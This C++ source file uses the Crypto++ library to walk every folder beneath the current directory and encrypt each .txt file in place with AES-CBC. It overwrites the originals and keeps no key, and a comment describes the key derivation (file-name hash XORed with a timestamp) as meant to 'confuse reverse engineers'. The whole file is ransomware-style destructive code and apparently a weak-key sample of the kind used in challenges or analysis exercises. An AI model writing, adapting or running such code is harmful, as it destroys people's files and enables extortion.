#include "cryptopp/aes.h"
#include "cryptopp/modes.h"
#include "cryptopp/files.h"
#include "cryptopp/sha.h"
#include "cryptopp/filters.h"

#include <filesystem>
#include <iostream>
#include <fstream>
#include <windows.h>
#include <ctime>

void recursiveEncryption(const std::string path = ".");
void encryptFile(const std::string& filename);
byte* hashString(const std::string);

int main()
{
	recursiveEncryption();
	return 0;
}

void recursiveEncryption(const std::string path)
{
	for (const auto& entry : std::filesystem::directory_iterator(path))
	{
		if (entry.is_directory())
		{
			recursiveEncryption(entry.path().string());
		}
		else if (entry.path().extension() == ".txt")
		{
			encryptFile(entry.path().string());
		}
	}
}

void encryptFile(const std::string& filename)
{
	// Create filename for the encrypted copyn
	std::string filenameCpy = filename + ".cpy";

	// Create 64 "random" bytes to create key
	byte* k = hashString(filename.substr(filename.rfind("\\") + 1));
	CryptoPP::SecByteBlock seed(k, 64);
	
	// Do some magic to confuse reverse engineers
		// key = xor(seed[0:32], timestamp[:3])
		CryptoPP::SecByteBlock key(32);
		int t = std::time(0);
		for (int i = 0; i < 32; i++)
		{
			byte bt = t >> (i % 4 * 8) & 0xff;
			key[i] = seed[i] ^ bt;
		}

		// iv = xor(seed[32:48], seed[48:64])
		CryptoPP::SecByteBlock iv(16);
		for (int i = 0; i < 16; i++)
		{
			iv[i] = seed[i + 32] ^ seed[i + 48];
		}

	// init the AES encryption
	CryptoPP::CBC_Mode<CryptoPP::AES>::Encryption e;
	e.SetKeyWithIV(key, key.size(), iv, iv.size());
	
	// Open input and output file
	std::ifstream in{ filename, std::ios::binary };
	std::ofstream out{ filenameCpy, std::ios::binary };

	// Encrypt file content
	CryptoPP::FileSource fs{ in, true,
		new CryptoPP::StreamTransformationFilter{
			e, new CryptoPP::FileSink{out}
		}
	};

	// Close file streams
	in.close();
	out.close();

	// Rename file.cpy to file and overwrite unencrypted file
	std::filesystem::rename(filenameCpy, filename);
}

byte* hashString(std::string data)
{
	byte const* byteData = (byte*)data.data();
	byte* hash = new byte[CryptoPP::SHA512::DIGESTSIZE];

	CryptoPP::SHA512().CalculateDigest(hash, byteData, data.size());

	return hash;
}